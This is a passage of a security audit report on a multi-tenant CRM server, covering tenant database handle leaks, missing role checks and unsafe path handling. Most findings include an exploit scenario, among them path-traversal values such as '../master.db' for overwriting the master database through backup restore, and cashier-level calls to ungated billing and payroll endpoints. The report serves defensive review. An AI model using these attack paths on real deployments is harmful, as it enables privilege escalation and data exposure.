- Description: Queries such as `SELECT * FROM invoices WHERE id = ?` and `SELECT * FROM customers WHERE id = ? AND is_deleted = 0` do not include a `tenant_id` filter. In a conventional shared-schema multi-tenant system this would be a critical IDOR. In BizarreCRM the isolation model is instead **per-tenant SQLite files**: `tenantResolver` sets `req.db` and `req.asyncDb` to open handles for the subdomain's own database file, so every query is inherently scoped to that tenant's DB. There is no `tenant_id` column at the row level because it would be redundant.
- Assessment: The architecture is sound; bare-PK queries are not an IDOR concern here. The risk would only materialise if the tenant DB handle were ever shared across tenants (a singleton mistake), which the pool's slug-keyed architecture prevents.
- Fix: No action required. Documented to confirm the absence of a cross-tenant IDOR is by design, not by accident.

---

## Summary

The dominant finding is the missing `releaseTenantDb` call after normal HTTP requests, which causes a slow pool refcount leak leading to handle and memory exhaustion (DoS). There are no cross-tenant data-access vulnerabilities: the slug-to-subdomain resolution is cryptographically anchored via JWT tenant binding in `auth.ts`, the pool is keyed by the validated slug from the master DB (not user input), DB file paths are verified with `startsWith(tenantDataDir)`, and per-tenant SQLite files give implicit row-level isolation. The super-admin panel is restricted to `localhostOnly` and has its own separate JWT secret and session table.

---

## PASS 2 — DEEP DIVE

### [MEDIUM] ReportEmailer cron acquires tenant pool handles without ever releasing them

**Where:** `packages/server/src/index.ts:3538–3557`

**What:**
The weekly-summary cron (fires every 5 min) calls `getTenantDb(t.slug)` for every active tenant to read `store_config` (timezone and owner email), pushes the live pool handle into a `targets` array, and returns. There is no `releaseTenantDb` call — not in a `finally` block, not inside `runReportEmailerTick`, not anywhere. Each tick therefore increments every tenant's refcount by 1, the handles are never decremented, and (as with the HTTP path noted in Pass 1) they become permanently ineligible for LRU eviction.

**Code:**
```typescript
// index.ts:3538–3557
for (const t of rows) {
  try {
    const tenantDb = await getTenantDb(t.slug);   // refcount +1, NEVER released
    const tzRow = tenantDb.prepare("SELECT value FROM store_config WHERE key = 'store_timezone'").get() as ...;
    const emailRow = tenantDb.prepare("SELECT value FROM store_config WHERE key = 'owner_email'").get() as ...;
    const tenantDbPath = path.join(
      config.tenantDataDir || path.join(path.dirname(config.dbPath), 'tenants'),
      `${t.slug}.db`,
    );
    targets.push({ db: tenantDb, adb: createAsyncDb(tenantDbPath), ... });
  } catch (err) { ... }
  // No finally { releaseTenantDb(t.slug) }
}
```

**Exploit:**
Every 5-minute tick permanently leaks one refcount per tenant. After N ticks, `pool.get(slug).refcount === N` for all tenants that were active during at least one tick. The pool is effectively permanently full; new tenants or eviction-triggered reconnects overflow into unbounded extra handles. On a 100-tenant deployment this is 100 permanent handle leaks every 5 minutes — 12,000 per hour. This also compounds the HTTP-path leak from Pass 1.

**Fix:**
Wrap each iteration in a `try/finally` that calls `releaseTenantDb(t.slug)` after the handle is read from, and read the two `store_config` values inside that try block. Pass only the path string and extracted values to `targets`, not the live DB handle — the `db` field in `targets` is used inside `runReportEmailerTick → sendWeeklySummary`, so if `db` is genuinely needed for the summary query, use a separate guarded `getTenantDb/releaseTenantDb` pair there instead.

---

### [MEDIUM] `webhookTenantResolver` acquires tenant pool handle without releasing it

**Where:** `packages/server/src/index.ts:1568–1592`

**What:**
For the path-based webhook endpoints (`/api/v1/t/:slug/sms/inbound-webhook`, etc.), a custom `webhookTenantResolver` middleware calls `getTenantDb(tenant.slug)` at line 1579 to set `req.db` and does not register any `res.on('finish', ...)` handler to call `releaseTenantDb`. The downstream webhook handler (`smsInboundWebhookHandler`, etc.) never calls `releaseTenantDb` either. Every path-based webhook request therefore leaks one refcount, compounding the pool exhaustion described in Pass 1.

**Code:**
```typescript
// index.ts:1568–1587
const webhookTenantResolver = async (req: any, res: any, next: any) => {
  const { slug } = req.params;
  if (!slug || !req.tenantSlug) {
    const tenant = masterDb.prepare("SELECT id, slug FROM tenants WHERE slug = ? AND status = 'active'").get(slug) as TenantRow | undefined;
    if (!tenant) return res.status(404).json(...);
    try {
      req.db = await getTenantDb(tenant.slug);   // refcount +1, never released
      req.tenantSlug = tenant.slug;
      req.tenantId = tenant.id;
    } catch { ... }
  }
  next();
};
```

**Exploit:**
Providers that POST to the path-based webhook URLs (e.g., Twilio configured with `https://host/api/v1/t/acme/sms/inbound-webhook`) will leak one pool refcount per inbound message. Under normal SMS volume (thousands of messages/day across all tenants) this will permanently inflate refcounts into the hundreds and pin all handles above refcount 0, preventing LRU eviction entirely.

**Fix:**
Add `res.on('finish', () => releaseTenantDb(tenant.slug))` immediately after the successful `getTenantDb` call inside `webhookTenantResolver`. Wrap in `try/catch` to absorb double-release errors.

---

### [MEDIUM] db-worker thread pool validates `dbPath` only as non-empty string — no containment check

**Where:** `packages/server/src/db/db-worker.mjs:107–131` and `packages/server/src/db/async-db.ts:43–57`

**What:**
The `db-worker.mjs` `assertTask` function validates `task.dbPath` only as "a non-empty string". It passes that path directly to `new Database(dbPath)` (line 34), which opens any SQLite file on the filesystem the process can reach. The `createAsyncDb(dbPath)` factory in `async-db.ts` takes any string and forwards it verbatim to worker threads. There is no `path.resolve().startsWith(tenantDataDir)` guard analogous to the one in `tenant-pool.ts:openDb`. In `tenantResolver.ts:513` the path is constructed safely from `tenant.slug` (already slug-validated) and `config.tenantDataDir` (hardcoded), so no traversal is possible from the normal request path. However, any code that calls `createAsyncDb()` with an externally derived or misconfigured path skips the containment check entirely.

**Code:**
```javascript
// db-worker.mjs:107–115
function assertTask(task) {
  if (!task || typeof task !== 'object')
    throw Object.assign(new Error('db-worker: task must be an object'), { code: 'E_BAD_TASK' });
  if (typeof task.dbPath !== 'string' || task.dbPath.length === 0)
    throw Object.assign(new Error('db-worker: task.dbPath must be a non-empty string'), { code: 'E_BAD_TASK' });
  // No path containment check
```

**Exploit:**
If a future code path passes an attacker-influenced path to `createAsyncDb` (e.g., a misconfigured `TENANT_DATA_DIR` env that becomes the fallback base in `tenantResolver.ts:513`), the worker silently opens and queries arbitrary SQLite files. Currently not directly reachable from tenant-controlled input, but is a latent defense-in-depth gap.

**Fix:**
Add a `path.resolve(task.dbPath).startsWith(path.resolve(WORKER_ALLOWED_DB_ROOT))` check in `assertTask`, where `WORKER_ALLOWED_DB_ROOT` is passed to workers at initialization (e.g., via `workerData`). This closes the gap regardless of how `createAsyncDb` is called.

---

### [MEDIUM] `db_path` column from master DB used in file operations without containment validation

**Where:** `packages/server/src/routes/super-admin.routes.ts:1307, 1536`, `packages/server/src/services/tenantTermination.ts:306`, `packages/server/src/services/tenant-provisioning.ts:770, 834`, `packages/server/src/db/migrate-all-tenants.ts:204`

**What:**
Multiple locations read the `db_path` column from the master DB `tenants` table and construct file paths using `path.join(config.tenantDataDir, t.db_path)` without verifying that the resolved path stays within `config.tenantDataDir`. The `db_path` value is set to `"${slug}.db"` during provisioning (a safe value), but the column has no `CHECK` constraint and no application-level validation at read time. By contrast, `tenant-pool.ts:openDb` does apply the `startsWith` check. If a super-admin operator or a SQL-level compromise modifies `db_path` to `"../master.db"` or `"../../etc/passwd"`, calls like `fs.statSync(path.join(tenantDataDir, t.db_path))` (line 683/1307 in super-admin.routes.ts) or `backupRestore(tdb, filename, { targetDbPath: path.join(tenantDataDir, tenant.db_path) })` (line 1536) would target files outside `tenantDataDir`. The restore path at 1536 is especially dangerous: the backup restore service overwrites the `targetDbPath` file with attacker-supplied backup content.

**Code:**
```typescript
// super-admin.routes.ts:1536
const tenantDbPath = path.join(config.tenantDataDir, tenant.db_path); // no startsWith check
const result = await backupRestore(tdb, filename, {
  targetDbPath: tenantDbPath,  // file at this path is overwritten
  expectedSlug: slug,
  ...
});
```

**Exploit:**
A compromised super-admin account (or direct DB manipulation) sets `tenants.db_path = '../master.db'`. A subsequent `/api/v1/super-admin/tenants/{slug}/backups/{file}/restore` call overwrites `master.db` with an attacker-crafted SQLite file, replacing the super-admin password hash and gaining persistent super-admin access.

**Fix:**
Add a `startsWith` containment assertion immediately after every `path.join(config.tenantDataDir, t.db_path)` call — the same pattern as `tenant-pool.ts:openDb` lines 77–79. Additionally add a `CHECK` constraint on `db_path` in the `tenants` schema to reject values containing `..` or `/`.

---

### [LOW] Health-score cron constructs `asyncDb` path via the same dual-base fallback as `tenantResolver`

**Where:** `packages/server/src/index.ts:3691–3695`

**What:**
The hourly health-score cron constructs an `asyncDb` path using `config.tenantDataDir || path.join(path.dirname(config.dbPath), 'tenants')` — the same `||` fallback present in `tenantResolver.ts:513`. Since `config.tenantDataDir` is hardcoded (not env-driven) this never fires in practice. However the `asyncDb` handle is created from this path while the `tenantDbHandle` from `getTenantDb` was opened from the pool's always-hardcoded `config.tenantDataDir`. If they diverged (e.g., `config.dbPath` were in a different directory), the cron would query a different file than the pool handle, causing subtle data divergence.

**Code:**
```typescript
// index.ts:3691–3695
const tenantDbPath = path.join(
  config.tenantDataDir || path.join(path.dirname(config.dbPath), 'tenants'),
  `${t.slug}.db`,
);
const adb = createAsyncDb(tenantDbPath);
```

**Exploit:**
Low exploitability in default deployment. If `TENANT_DATA_DIR` env is intentionally unset (not currently supported), cron queries diverge from request queries on the same tenant, causing stale health scores and potentially committing data to the wrong file.

**Fix:**
Remove the `||` fallback and use `config.tenantDataDir` unconditionally everywhere. Alternatively, derive the path directly from `tenantDbHandle.filename` (the pool's actual open file) rather than reconstructing it from config.

---

### [LOW] Pool slug-lock chain grows unbounded if slugLocks entry is not pruned on concurrent waiters

**Where:** `packages/server/src/db/tenant-pool.ts:43–57`

**What:**
`withSlugLock` chains promises via `slugLocks.set(slug, prev.then(() => next))`. The cleanup condition `if (slugLocks.get(slug) === next) slugLocks.delete(slug)` fires only for the LAST waiter — but if there are concurrent callers already waiting on `prev`, `slugLocks.get(slug)` will have been replaced by a subsequent caller's `next2`, so the delete does not fire for the first-completing caller. Under steady HTTP load for a busy tenant, the chain grows as fast as concurrent requests arrive and only shrinks when the last in-flight request for that slug completes. For a tenant serving hundreds of concurrent requests the slugLocks map entry can hold a chain of hundreds of Promise references in memory. Node's GC should collect settled promises, but the chain structure means the head of the chain is still referenced by `prev.then(...)` until the entire chain unwinds.

**Code:**
```typescript
// tenant-pool.ts:43–57
function withSlugLock<T>(slug: string, fn: () => Promise<T>): Promise<T> {
  const prev = slugLocks.get(slug) ?? Promise.resolve();
  let release!: () => void;
  const next = new Promise<void>((r) => { release = r; });
  slugLocks.set(slug, prev.then(() => next));
  return prev.then(async () => {
    try { return await fn(); }
    finally {
      release();
      if (slugLocks.get(slug) === next) slugLocks.delete(slug); // only last waiter prunes
    }
  });
}
```

**Exploit:**
Not cross-tenant exploitable. Under sustained burst traffic for a single slug (e.g., a flash sale), the slugLocks chain for that slug can accumulate hundreds of promise references. Memory impact is modest (one Promise object per concurrent caller) and self-heals when load drops. No security boundary is crossed.

**Fix:**
Use a simpler per-slug queued mutex: a `Map<string, number>` counting in-flight callers. Delete the entry when the count reaches 0 in the `finally` block. This avoids the linked-promise chain altogether.

---

### [INFO] `db-worker.mjs` opens arbitrary new file paths on LRU eviction miss — no WAL checkpoint before close

**Where:** `packages/server/src/db/db-worker.mjs:62–83`

**What:**
When the worker's per-thread LRU cache evicts the oldest entry (`cache.size >= MAX_CACHED_DBS`) it calls `oldest.close()`. SQLite's WAL mode requires a checkpoint before close to ensure WAL frames are merged back to the main DB file. `better-sqlite3` performs an implicit checkpoint during `db.close()` via `sqlite3_close`, but only if the WAL is not held open by a writer. If the evicted handle had an uncommitted transaction open (e.g., a stuck query that timed out via Piscina's AbortController but left an incomplete implicit transaction), `close()` may skip checkpointing and leave WAL frames unreferenced. This is an edge case, not a security flaw, but data integrity could be affected.

**Fix:**
Before eviction, call `db.pragma('wal_checkpoint(TRUNCATE)')` in a `try/catch` to force a checkpoint while the handle is still valid. This is safe to call on a handle with no active transactions.

---


---

# S09-rbac

# S09 — Role-Based Access Control / Authorization

## Findings

---

### [MEDIUM] GET /roles/users/:userId/role — any authenticated user can query another user's custom-role assignment

- **File:** `packages/server/src/routes/roles.routes.ts:336-350`
- **Description:** The `GET /roles/users/:userId/role` endpoint has no role gate whatsoever. Any authenticated user (cashier, technician) can supply an arbitrary `userId` and learn which custom role that user carries (`role_name`, `description`). The sibling `PUT /roles/users/:userId/role` correctly calls `requireAdmin`, but the read endpoint was left open.
- **Exploit:** A cashier calls `GET /api/v1/roles/users/1/role` to confirm the owner's custom role assignment. Combined with `GET /roles/:id/permissions` (admin-only) a cashier cannot read the full matrix, but they can determine *which named role* any user has been assigned — useful for social engineering or confirming whether their own role has been changed after a revocation event.
- **Fix:** Add `requireAdmin(req)` at the top of this handler, consistent with all sibling handlers in the same file.

---

### [LOW] GET /team/payroll/periods — payroll period metadata readable by any authenticated user

- **File:** `packages/server/src/routes/team.routes.ts:847-856`
- **Description:** `GET /team/payroll/periods` has no role guard. Every authenticated user (including cashier) can list all payroll period records including names, date ranges, `locked_at`, and `locked_by_user_id`. The sibling `POST /team/payroll/periods` and `POST /team/payroll/lock/:periodId` are both properly gated (manager/admin and admin respectively). The CSV export and lock routes are admin-only. Only the list endpoint is open.
- **Exploit:** A cashier polls `GET /team/payroll/periods` to learn whether the current period is locked before attempting to manipulate a clock entry or commission (clock-in/out routes check `isCommissionLocked` independently, so this is informational rather than a bypass). More concretely it leaks organisational payroll calendar metadata to all staff.
- **Severity rationale:** Downgraded to LOW because no financial data is exposed; names and dates only. All mutation gates are intact.
- **Fix:** Add `requireAdminOrManager(req)` at the top of the `GET /team/payroll/periods` handler.

---

### [LOW] GET /team/payroll/lock-check — any authenticated user can probe lock state for an arbitrary timestamp

- **File:** `packages/server/src/routes/team.routes.ts:1002-1010`
- **Description:** `GET /team/payroll/lock-check?at=<timestamp>` is ungated. It was designed as an internal helper consumed by other routes (e.g. to check lock status before a write), but is accessible to any authenticated caller. A cashier can enumerate which date ranges are locked.
- **Exploit:** Low impact on its own — returns only `{ locked: true|false }`. Paired with the open periods list above it provides a complete picture of payroll locking state to all staff.
- **Fix:** Add `requireAdminOrManager(req)` or scope the endpoint to server-internal use only (e.g. use a direct function call rather than an HTTP sub-request).

---

### [LOW] GET /team/shifts — all employees' shift schedules visible to any authenticated user

- **File:** `packages/server/src/routes/team.routes.ts:83-113`
- **Description:** The shift list endpoint has no role guard. Any authenticated user can query the full shift schedule for all employees (with first name, last name, username JOIN) by omitting the `user_id` filter. POST/PUT/DELETE shifts are all gated with `requireAdminOrManager`. The list is open.
- **Exploit:** A cashier who wants to know when a manager will not be in-store calls `GET /team/shifts` with a future date range. This exposes full org scheduling data.
- **Fix:** Either (a) add `requireAdminOrManager(req)` to enforce manager-level access for the full list, or (b) allow self-read only — enforce `userId === req.user.id` when `user_id` query param is absent or supplied, calling `requireAdminOrManager` only when requesting another employee's shifts.

---

### [LOW] GET /team/time-off — all employees' time-off requests visible to any authenticated user

- **File:** `packages/server/src/routes/team.routes.ts:244-271`
- **Description:** Same gap as shifts. The read endpoint has no role gate; `user_id` filter is optional. Any cashier can list every time-off request org-wide (including reasons). PUT (approve/deny) and DELETE are gated. POST (request) correctly restricts non-managers to self-filing only.
- **Exploit:** A cashier enumerates all pending/approved time-off requests with reasons to learn colleagues' personal circumstances.
- **Fix:** Apply the same self-vs-privileged split as POST: when `user_id` !== `req.user.id`, call `requireAdminOrManager(req)`.

---

### [INFORMATIONAL] requireAdmin uses strict `=== 'admin'` — correctly resistant to weak gate

- **File:** `packages/server/src/routes/roles.routes.ts:82-86`, `packages/server/src/routes/team.routes.ts:54-58`
- **Description:** All `requireAdmin` helpers use `!== 'admin'` (strict equality), not truthy checks. `requireAdminOrManager` similarly uses `!== 'admin' && !== 'manager'`. No weak `if (user.role)` gates found.
- **Status:** CLEAN

---

### [INFORMATIONAL] Privilege escalation via role update — blocked

- **File:** `packages/server/src/routes/roles.routes.ts:289-334`, `packages/server/src/routes/settings.routes.ts:1572-1808`
- **Description:** Both role-assignment paths (`PUT /roles/users/:userId/role` and `PUT /settings/users/:id`) are admin-gated. The settings route additionally: (a) validates `role` against `VALID_ROLES` derived from the shared constants — no arbitrary role strings accepted; (b) requires `admin_confirm_password` + optional TOTP re-auth for any role change; (c) enforces a 24 h cooldown after backup-code recovery before a role can be changed; (d) prevents the last active admin from demoting themselves; (e) revokes the target's sessions immediately when demoted from admin.
- **Status:** CLEAN — no privilege escalation path found.

---

### [INFORMATIONAL] Default role on signup — 'admin' for tenant owner, 'technician' for staff

- **File:** `packages/server/src/routes/signup.routes.ts:448`, `packages/server/src/routes/settings.routes.ts:1514`
- **Description:** The tenant-provisioning flow creates exactly one `admin` user. Subsequent staff users created via `POST /settings/users` default to `'technician'` (least-privileged enumerated role) and are validated against `VALID_ROLES`. No path exists for an unauthenticated caller to choose their own role.
- **Status:** CLEAN

---

### [INFORMATIONAL] Permission cache — no stale-cache risk

- **File:** `packages/server/src/middleware/auth.ts:162-178`
- **Description:** Custom-role permissions are re-fetched from the DB on every authenticated request (inside `authMiddleware`). There is no in-process cache of permission sets. A role revocation takes effect on the next request, bounded by the session's `expires_at`. When a user is deactivated or their role is demoted from admin, their sessions are explicitly deleted (`DELETE FROM sessions WHERE user_id = ?`), so the JWT will fail session verification on the next call.
- **Status:** CLEAN — no stale permission cache risk.

---

### [INFORMATIONAL] Self-modification / chain-of-command — protected

- **File:** `packages/server/src/routes/employees.routes.ts:311,412`, `packages/server/src/routes/settings.routes.ts:1613-1640`
- **Description:** Clock-in/out restrict non-admins to self-only (checked by `req.user.id !== id`). Pay-rate edits are admin-only. Role changes require admin + re-auth + last-admin-guard. No employee can disable/delete another employee outside admin scope.
- **Status:** CLEAN

---

### [INFORMATIONAL] Knowledge-base CRUD — intentionally open to all authenticated staff

- **File:** `packages/server/src/routes/team.routes.ts:769-841`
- **Description:** `POST /team/kb` and `PUT /team/kb/:id` have no role gate — any authenticated user can create or edit articles. Only DELETE requires `requireAdminOrManager`. The code comment explicitly states this is intentional ("each shop can build their own"). This is a design choice, not a vulnerability, but it means a cashier could post misleading content visible to other staff.
- **Status:** BY DESIGN — flag for product team if staff-submitted content is a concern.

---

## PASS 2 — DEEP DIVE

### [MEDIUM] GET /employees/:id leaks pay_rate to any authenticated user

**Where:** `packages/server/src/routes/employees.routes.ts:252-268`

**What:**
`GET /employees/:id` fetches a user record that includes `pay_rate` at the SQL level, then applies a privilege fork at line 261 — but the `employee` object sent to non-privileged callers (line 266) already contains `pay_rate` from the `SELECT` that precedes the fork. The check gates the `clock_entries` and `commissions` arrays, not the base profile fields.

**Code:**
```typescript
const employee = await adb.get<any>(`
  SELECT id, username, email, first_name, last_name, role, avatar_url,
         is_active, pin IS NOT NULL AS has_pin, permissions, home_location_id,
         pay_rate, created_at, updated_at    -- pay_rate included here
  FROM users WHERE id = ?
`, id);
const isPrivileged = req.user?.role === 'admin' || req.user?.id === id;
if (!isPrivileged) {
  res.json({ success: true, data: employee }); // pay_rate leaks here
  return;
}
```

**Exploit:**
Any cashier calls `GET /api/v1/employees/3` where 3 is a manager's user ID. The response body contains `pay_rate: 28.50` (or equivalent). Competitor pay rates and internal compensation structure are exposed to all staff.

**Fix:**
Before the privilege fork, strip `pay_rate` from the `employee` object for non-privileged callers: `const { pay_rate: _pr, ...publicProfile } = employee;` and return `publicProfile`, or move `pay_rate` out of the base SELECT and into the privileged-only branch.

---

### [MEDIUM] GET /employees — all staff email + role + permissions blob readable by any authenticated user

**Where:** `packages/server/src/routes/employees.routes.ts:179-210`

**What:**
`GET /employees` has no role gate and returns `email`, `role`, `permissions` (the full JSON blob of per-user capability overrides), `home_location_id`, and current clock status for every active employee. This is a full staff directory with role enumeration and capability leak.

**Code:**
```typescript
router.get('/', asyncHandler(async (req, res) => {
  const adb = req.asyncDb;
  const employees = await adb.all(`
    SELECT u.id, u.username, u.email, u.first_name, u.last_name, u.role,
           u.avatar_url, u.is_active, u.pin IS NOT NULL AS has_pin,
           u.permissions, u.home_location_id, ...  -- no role gate
    FROM users u WHERE u.is_active = 1
  `);
  res.json({ success: true, data: employees });
}));
```

**Exploit:**
A cashier calls `GET /api/v1/employees` to enumerate all colleagues' work emails (useful for phishing or social engineering), their roles, and their exact `permissions` JSON which reveals which capabilities have been manually overridden from the role default. Combined with `GET /roles/users/:userId/role` (ungated — found in Pass 1) this fully maps the org's privilege landscape.

**Fix:**
(a) Add `requireAdminOrManager(req)` to gate the full list, or (b) allow any authenticated user to fetch a redacted list (first_name, last_name, role display only) and require manager+ for the full list including email and permissions.

---

### [MEDIUM] POST+GET /billing — any authenticated user can trigger Stripe Checkout and access Billing Portal

**Where:** `packages/server/src/routes/billing.routes.ts:46-97`  
**Also:** `packages/server/src/index.ts:1727`

**What:**
`POST /api/v1/billing/checkout` and `GET /api/v1/billing/portal` are mounted behind `authMiddleware` only — there is no role gate. Any authenticated user (cashier, technician) can initiate a Stripe Checkout session for the Pro plan upgrade or open the Stripe Billing Portal, which allows subscription management including plan changes and payment method updates.

**Code:**
```typescript
// index.ts:1727 — no requireAdmin before billingRoutes
app.use('/api/v1/billing', authMiddleware, billingRoutes);

// billing.routes.ts:46 — rate limit only, no role check
router.post('/checkout', billingRateLimit, async (req, res) => {
  // Any authenticated user reaches here
  const url = await createCheckoutSession(req.tenantId, req.tenantSlug, ...);
  res.json({ success: true, data: { url } });
});
router.get('/portal', billingRateLimit, async (req, res) => {
  // Any authenticated user can open Billing Portal
  const url = await createBillingPortalSession(stripe_customer_id, returnUrl);
  res.json({ success: true, data: { url } });
});
```

**Exploit:**
A cashier logs in, calls `GET /api/v1/billing/portal`, receives a valid Stripe Billing Portal URL, and uses it to cancel the tenant's Pro subscription or change payment details. The portal session is authenticated to the tenant's Stripe customer and grants full subscription management rights. Alternatively, they open checkout to trigger billing flows without the owner's knowledge.

**Fix:**
Add `adminOnly` (or at minimum `requireManagerOrAdmin`) middleware to both the checkout and portal routes. The `billingRateLimit` middleware is not a substitute for authorization.

---

### [MEDIUM] GET /settings-ext/history — settings audit log readable by any authenticated user

**Where:** `packages/server/src/routes/settingsExport.routes.ts:401-446`

**What:**
`GET /settings-ext/history` returns filtered `audit_logs` rows for events including `user_created`, `user_updated`, `user_deleted`, and all `settings_*` events. The file header states "All endpoints require admin role" and `adminOnly` is applied to every other route in this file (GET export, POST import, POST templates/apply, POST bulk) — but `GET /history` was omitted from the gate.

**Code:**
```typescript
// No adminOnly in the handler chain:
router.get(
  '/history',
  asyncHandler(async (req, res) => {
    const rows = await adb.all<...>(
      `SELECT al.id, al.event, al.user_id, al.meta, al.created_at
       FROM audit_logs al
       WHERE al.event LIKE 'settings_%'
          OR al.event IN ('store_updated','user_created','user_updated','user_deleted')
       ORDER BY al.created_at DESC LIMIT ?`,
      limit
    );
    // ...
  })
);
```

**Exploit:**
A cashier calls `GET /api/v1/settings-ext/history` to learn which admin accounts were recently created or updated (via `user_created`/`user_updated` events), whether a role change happened (`user_updated`), and which payment/SMS provider credentials were last changed (`settings_config_updated`). The `meta` JSON often carries the changed key names, giving an attacker a map of configuration churn.

**Fix:**
Insert `adminOnly,` as the second argument to the route handler, consistent with every other route in this file: `router.get('/history', adminOnly, asyncHandler(...))`.

---

### [MEDIUM] GET /employees/performance/all — all employees' revenue figures readable by any authenticated user

**Where:** `packages/server/src/routes/employees.routes.ts:216-237`

**What:**
`GET /employees/performance/all` has no role gate and returns `total_revenue` and `avg_ticket_value` for every employee in the org. Revenue attribution per staff member is sensitive payroll/incentive data. The per-employee performance endpoint `GET /employees/:id/performance` is also ungated.

**Code:**
```typescript
router.get('/performance/all', asyncHandler(async (req, res) => {
  // No requireAdmin or requireAdminOrManager
  const employees = await adb.all(`
    SELECT u.id, u.first_name, u.last_name, u.role,
           COUNT(DISTINCT t.id) AS total_tickets,
           COALESCE(SUM(t.total), 0) AS total_revenue,   -- financial data
           COALESCE(AVG(t.total), 0) AS avg_ticket_value
    FROM users u LEFT JOIN tickets t ...
  `);
  res.json({ success: true, data: employees });
}));
```

**Exploit:**
A cashier calls `GET /api/v1/employees/performance/all` to learn every technician's revenue numbers. Combined with knowing their own commission rate (from `GET /employees/:id`), this reveals a close approximation of each colleague's take-home pay — creating workplace tension or being used as leverage in salary negotiations without management's consent.

**Fix:**
Add `requireAdminOrManager(req)` at the top of both `GET /performance/all` and `GET /:id/performance` handlers, or apply a self-only rule for the per-ID variant.

---

### [LOW] GET /roles/permission-keys — full capability manifest readable by any authenticated user

**Where:** `packages/server/src/routes/roles.routes.ts:116-121`

**What:**
`GET /roles/permission-keys` returns the full list of permission key strings (e.g., `refunds.create`, `invoices.void`, `customers.gdpr_erase`, `admin.full`) with no role gate. Every other endpoint in this file is admin-only. While the list doesn't reveal assignments, it exposes the complete privilege surface to any authenticated caller — useful for constructing targeted social-engineering attacks ("can you approve a `refunds.approve` action?").

**Code:**
```typescript
router.get(
  '/permission-keys',
  asyncHandler(async (_req, res) => {
    res.json({ success: true, data: PERMISSION_KEYS }); // no requireAdmin
  }),
);
```

**Exploit:**
A cashier calls `GET /api/v1/roles/permission-keys` to enumerate every privilege the system supports. Combined with the ungated `GET /roles/users/:userId/role` (Pass 1 finding), they can also confirm whether a coworker has been granted elevated roles. Low blast radius on its own.

**Fix:**
Add `requireAdmin(req)` at the top of the handler; the permission keys list is administrative metadata and there's no legitimate reason for non-admin users to query it.

---

### [LOW] GET /employees and GET /employees/:id — manager role has no cross-employee visibility gate

**Where:** `packages/server/src/routes/employees.routes.ts:490-529` (hours), `532-583` (commissions)

**What:**
`GET /employees/:id/hours` and `GET /employees/:id/commissions` use `req.user?.role === 'admin' || req.user?.id === id` as the gate — this blocks a cashier from reading a manager's hours, but a `manager` role is not included in the admin bypass. Managers need to view their team's hours for payroll purposes; the current gate forces them to be blocked or uses `=== 'admin'` strictly. This is not an escalation bug — it's an under-permissive gate — but it means managers cannot access payroll data for their reports without also being `admin`.

**Code:**
```typescript
// hours endpoint:
if (req.user?.role !== 'admin' && req.user?.id !== id) {
  throw new AppError('Forbidden — can only view your own hours', 403);
}
```

**Exploit:**
Low risk — managers who need to review team payroll must be granted admin role, unnecessarily expanding the admin pool. A manager assigned to approve payroll periods (which is a `requireAdminOrManager` gate) cannot actually view the underlying clock data to validate it without admin access. This creates an operational blind spot.

**Fix:**
Change the gate to `req.user?.role !== 'admin' && req.user?.role !== 'manager' && req.user?.id !== id` so managers can access any employee's hours and commissions within the tenant.

---

### [INFO] SETTINGS_ADMIN_ROLES admits 'owner' string — invisible role not in VALID_ROLES

**Where:** `packages/server/src/routes/settings.routes.ts:112`

**What:**
`SETTINGS_ADMIN_ROLES = new Set(['admin', 'owner'])` accepts the string `'owner'` as an admin-equivalent for settings mutations. However, `VALID_ROLES` (derived from `ROLE_PERMISSIONS`) contains only `admin`, `manager`, `technician`, `cashier` — not `owner`. No signup or user-creation path can produce a user with `role === 'owner'`. The `'owner'` entry is dead code from a legacy role rename but creates confusion during code review: a developer checking `VALID_ROLES` to assess the privilege surface would miss that `'owner'` is accepted here.

**Code:**
```typescript
const SETTINGS_ADMIN_ROLES = new Set(['admin', 'owner']);
// But VALID_ROLES = new Set(Object.keys(ROLE_PERMISSIONS))
// ROLE_PERMISSIONS does not include 'owner'
```

**Fix:**
Remove `'owner'` from `SETTINGS_ADMIN_ROLES`. Verify no legacy user rows in any production tenant carry `role = 'owner'` before deploying. If legacy compatibility is required, add a migration to rewrite `'owner'` → `'admin'`.

---

### [INFO] billing.routes.ts — no audit log on checkout or portal access

**Where:** `packages/server/src/routes/billing.routes.ts:46-97`

**What:**
Neither `POST /billing/checkout` nor `GET /billing/portal` calls `audit()`. Subscription events (upgrade, cancel, payment method changes) that flow through the Stripe Billing Portal leave no server-side audit trail — only Stripe's own event log. If a malicious employee triggers a checkout or opens the portal (see the MEDIUM finding above), the action is invisible in the tenant's `audit_log`.

**Fix:**
After fixing the role gate, add `audit(req.db, 'billing_checkout_initiated', req.user!.id, req.ip, { tenant_id: req.tenantId })` and a corresponding entry for portal access.


---

# S10-tenant-lifecycle

# S10 — Tenant Provisioning, Repair, and Termination Lifecycle

**Auditor:** Slot 10 (automated)
**Date:** 2026-05-05
**Files reviewed:**
- `packages/server/src/services/tenant-provisioning.ts`
- `packages/server/src/services/tenant-repair.ts`
- `packages/server/src/services/tenantTermination.ts`
- `packages/server/src/services/sampleData.ts`
- `packages/server/src/db/template.ts`
- `packages/server/src/routes/signup.routes.ts`
- `packages/server/src/routes/super-admin.routes.ts` (repair/delete endpoints)
- `packages/server/src/routes/admin.routes.ts` (self-service termination)
- `packages/server/src/middleware/tenantResolver.ts`
- `packages/server/src/index.ts` (cron wiring)

---

## FINDING S10-01 — MEDIUM — Plaintext Password Stored in In-Memory Pending Signup Map

**File:** `packages/server/src/routes/signup.routes.ts` lines 108–121, 703

**Description:**  
The `pendingSignups` Map stores the user's plaintext `adminPassword` for up to 1 hour (TTL). Any in-process heap dump, Node.js `--inspect` attach, or crash report (e.g. via `process.on('uncaughtException')` that serialises the heap) will expose plaintext passwords for every outstanding unverified signup.

```ts
const pendingSignups = new Map<string, {
  ...
  adminPassword: string;   // PLAINTEXT for up to 1 hour
  ...
}>();
```

**Impact:** Heap dump / memory inspection by any privileged observer (ops tooling, crash reporter, `--inspect` socket) leaks passwords. A process restart also logs `tokenPrefix` (first 8 chars) to application logs — that log line does not include the password, but the co-location of the token prefix and unprocessed password in the same map entry makes the data easier to correlate.

**Recommendation:**  
Store a bcrypt hash of the password in `pendingSignups`; pass the hash directly to `provisionTenant` (which already accepts a pre-hash path, or a small refactor of `provisionTenantInner`). The hash is sufficient for the provisioning step and cannot be reversed by a heap observer.

---

## FINDING S10-02 — MEDIUM — Hardcoded Default PIN "1234" Created for Every Admin User

**File:** `packages/server/src/services/tenant-provisioning.ts` line 347

**Description:**  
Every new tenant admin is provisioned with a bcrypt hash of the literal PIN `1234`:

```ts
const defaultPin = await bcrypt.hash('1234', 12);
```

